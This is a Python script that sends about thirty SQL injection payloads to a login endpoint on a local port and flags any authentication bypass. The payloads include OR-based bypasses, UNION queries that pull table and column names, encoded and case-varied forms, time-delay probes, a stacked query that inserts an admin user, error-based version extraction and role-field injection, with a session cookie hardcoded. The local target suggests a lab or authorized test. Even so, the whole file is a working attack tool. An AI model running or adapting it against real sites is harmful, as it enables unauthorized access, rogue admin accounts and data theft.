#!/usr/bin/env python3
"""
SQL Injection Testing Script for /login endpoint
Tests various bypass techniques, encodings, and case variations
"""

import requests
import json
import time
import urllib.parse

# Target configuration
TARGET_URL = "http://127.0.0.1:5003/login"
SESSION_COOKIE = ".eJwlzjEOwzAIQNG7MHcwYAzOZSKwsdo1aaaqd2-kLn_6w_vAvo48n7C9jysfsL8mbEA6yuJevKYZ3XGpMRpNaaqebjKUiIqFiqZIFoyVEynvaWBti7PNHjxp1kiLJdSoau-s2oUtMxkbO-pAlV5mX3WwoC0Pbw435Drz-GsQvj-bfy7z.aVnOqA.TJyqsDjwRheax83x10LTO6w-GR0"

# Cookie jar with session
cookies = {"session": SESSION_COOKIE}

# Set headers
headers = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Content-Type": "application/x-www-form-urlencoded",
    "Accept": "application/json, text/plain, */*",
    "X-Requested-With": "XMLHttpRequest"
}

def send_payload(payload_data, payload_name):
    """Send payload and capture response details"""
    print(f"\n{'='*60}")
    print(f"Testing: {payload_name}")
    print(f"Payload: {payload_data}")
    print('='*60)
    
    start_time = time.time()
    try:
        response = requests.post(
            TARGET_URL,
            data=payload_data,
            cookies=cookies,
            headers=headers,
            allow_redirects=False,
            timeout=10
        )
        end_time = time.time()
        response_time = round(end_time - start_time, 3)
        
        print(f"[+] Response Time: {response_time}s")
        print(f"[+] Status Code: {response.status_code}")
        print(f"[+] Response Headers:")
        for key, value in response.headers.items():
            print(f"  {key}: {value}")
        
        # Check for Set-Cookie headers
        if 'Set-Cookie' in response.headers:
            print(f"\n[!] NEW SESSION TOKEN ISSUED!")
            print(f"Set-Cookie: {response.headers['Set-Cookie']}")
        
        # Try to parse JSON response
        try:
            json_response = response.json()
            print(f"\n[+] JSON Response:")
            print(json.dumps(json_response, indent=2))
            
            # Check for success indicators
            success = json_response.get('success', False)
            message = json_response.get('message', '')
            redirect = json_response.get('redirect', '')
            
            if success or response.status_code == 302 or 'dashboard' in redirect.lower():
                print(f"\n{'*'*60}")
                print(f"[*] AUTHENTICATION BYPASS SUCCESSFUL!")
                print(f"[*] Redirect URL: {redirect}")
                print(f"[*] Success: {success}")
                print(f"[*] Message: {message}")
                print(f"{'*'*60}")
                return True
                
        except json.JSONDecodeError:
            print(f"\n[+] Response Body (non-JSON):")
            print(response.text[:1000])
        
        return False
        
    except requests.exceptions.RequestException as e:
        print(f"[-] Request failed: {e}")
        return False

def test_payloads():
    """Test various SQL injection payloads with different techniques"""
    results = []
    successful_payloads = []
    
    # Payload categories
    test_cases = [
        # 1. Classic authentication bypass
        {
            "name": "Classic Bypass - admin' OR '1'='1",
            "data": {"username": "admin' OR '1'='1", "password": "doesntmatter", "role": "user"}
        },
        {
            "name": "Classic Bypass with comment - admin'-- ",
            "data": {"username": "admin'-- ", "password": "anything", "role": "user"}
        },
        {
            "name": "Alternative comment - admin'#",
            "data": {"username": "admin'#", "password": "anything", "role": "user"}
        },
        {
            "name": "OR 1=1 basic",
            "data": {"username": "' OR 1=1--", "password": "", "role": "user"}
        },
        {
            "name": "OR 1=1 with LIMIT",
            "data": {"username": "' OR 1=1 LIMIT 1--", "password": "", "role": "user"}
        },
        
        # 2. UNION-based injection
        {
            "name": "UNION bypass - 2 columns",
            "data": {"username": "' UNION SELECT 'admin','admin','user'--", "password": "", "role": "user"}
        },
        {
            "name": "UNION bypass - 3 columns with admin",
            "data": {"username": "' UNION SELECT 'admin', 'adminpass', 'admin'--", "password": "adminpass", "role": "admin"}
        },
        {
            "name": "UNION to extract users",
            "data": {"username": "' UNION SELECT table_name, column_name, 'user' FROM information_schema.columns WHERE table_name like 'user%'--", "password": "", "role": "user"}
        },
        
        # 3. URL Encoded payloads
        {
            "name": "URL Encoded - admin%27%20OR%20%271%27%3D%271",
            "data": {"username": "admin%27%20OR%20%271%27%3D%271", "password": "any", "role": "user"}
        },
        {
            "name": "URL Encoded comment - admin%27--%20",
            "data": {"username": "admin%27--%20", "password": "any", "role": "user"}
        },
        
        # 4. Double URL Encoded
        {
            "name": "Double URL Encoded - admin%2527%2520OR%2520%25271%2527%253D%25271",
            "data": {"username": "admin%2527%2520OR%2520%25271%2527%253D%25271", "password": "any", "role": "user"}
        },
        {
            "name": "Double URL Encoded comment",
            "data": {"username": "admin%2527--%2520", "password": "any", "role": "user"}
        },
        
        # 5. Case variations
        {
            "name": "Case Variation - AdMiN' Or '1'='1",
            "data": {"username": "AdMiN' Or '1'='1", "password": "any", "role": "user"}
        },
        {
            "name": "Case Variation SQL keywords - ' OR 1=1--",
            "data": {"username": "' oR 1=1--", "password": "any", "role": "user"}
        },
        {
            "name": "Case Variation - ' UnIoN SeLeCt",
            "data": {"username": "' UnIoN SeLeCt 'admin','pass','admin'--", "password": "pass", "role": "admin"}
        },
        
        # 6. Comment-based injections
        {
            "name": "MySQL comment /**/ - '/**/OR/**/1=1",
            "data": {"username": "'/**/OR/**/1=1", "password": "", "role": "user"}
        },
        {
            "name": "Comment with version - '/*!12345OR*/1=1",
            "data": {"username": "'/*!12345OR*/1=1", "password": "", "role": "user"}
        },
        {
            "name": "Block comment bypass - 'OR/*test*/1=1--",
            "data": {"username": "'OR/*test*/1=1--", "password": "", "role": "user"}
        },
        
        # 7. Boolean-based time delays
        {
            "name": "Time-based MySQL - SLEEP(5)",
            "data": {"username": "admin' AND SLEEP(5)--", "password": "any", "role": "user"}
        },
        {
            "name": "Time-based PostgreSQL - pg_sleep(5)",
            "data": {"username": "admin' AND pg_sleep(5)--", "password": "any", "role": "user"}
        },
        
        # 8. Alternative syntax
        {
            "name": "LIKE operator - admin' LIKE '%",
            "data": {"username": "admin' LIKE '%", "password": "any", "role": "user"}
        },
        {
            "name": "BETWEEN operator",
            "data": {"username": "admin' AND 1 BETWEEN 1 AND 1--", "password": "any", "role": "user"}
        },
        
        # 9. Null byte injection
        {
            "name": "Null byte - admin'%00",
            "data": {"username": "admin'%00", "password": "any", "role": "user"}
        },
        {
            "name": "Null byte with OR - admin'%00OR'1'='1",
            "data": {"username": "admin'%00OR'1'='1", "password": "any", "role": "user"}
        },
        
        # 10. Stacked queries
        {
            "name": "Stacked query - admin'; SELECT * FROM users--",
            "data": {"username": "admin'; SELECT * FROM users--", "password": "any", "role": "user"}
        },
        {
            "name": "Stacked with INSERT",
            "data": {"username": "'; INSERT INTO users (username,password,role) VALUES ('hacked','pass','admin')--", "password": "any", "role": "user"}
        },
        
        # 11. Error-based injection
        {
            "name": "Error-based - EXTRACTVALUE",
            "data": {"username": "admin' AND EXTRACTVALUE(1,CONCAT(0x7e,version(),0x7e))--", "password": "any", "role": "user"}
        },
        
        # 12. Alternative quotes
        {
            "name": "Double quotes - \"admin\" OR \"1\"=\"1",
            "data": {"username": '"admin" OR "1"="1"', "password": "any", "role": "user"}
        },
        
        # 13. Parentheses wrapping
        {
            "name": "Parentheses - admin') OR ('1')=('1",
            "data": {"username": "admin') OR ('1')=('1", "password": "any", "role": "user"}
        },
        
        # 14. Multi-role bypass
        {
            "name": "Role injection - admin' OR role='admin",
            "data": {"username": "admin", "password": "any", "role": "admin' OR role='admin"}
        }
    ]
    
    print(f"[*] Starting SQL Injection Testing")
    print(f"[*] Target: {TARGET_URL}")
    print(f"[*] Testing {len(test_cases)} different payloads...\n")
    
    # Track successful bypasses
    for idx, test_case in enumerate(test_cases, 1):
        print(f"\n{'#'*60}")
        print(f"Test {idx}/{len(test_cases)}: {test_case['name']}")
        print(f"{'#'*60}")
        
        success = send_payload(test_case['data'], test_case['name'])
        results.append({
            "test_id": idx,
            "name": test_case['name'],
            "payload": test_case['data'],
            "success": success
        })
        
        if success:
            successful_payloads.append(test_case['name'])
            print(f"\n[!!!] SUCCESSFUL BYPASS DETECTED!")
        
        # Add small delay between requests
        time.sleep(0.5)
    
    # Summary
    print(f"\n{'='*60}")
    print("TESTING SUMMARY")
    print(f"{'='*60}")
    print(f"Total payloads tested: {len(results)}")
    print(f"Successful bypasses: {len(successful_payloads)}")
    
    if successful_payloads:
        print(f"\n[*] SUCCESSFUL PAYLOADS:")
        for i, payload_name in enumerate(successful_payloads, 1):
            print(f"  {i}. {payload_name}")
    else:
        print(f"\n[-] No successful authentication bypasses found")
    
    # Check for any anomaly patterns
    print(f"\n[*] Test complete. Check response times and status codes for time-based SQLi")
    return results

if __name__ == "__main__":
    results = test_payloads()
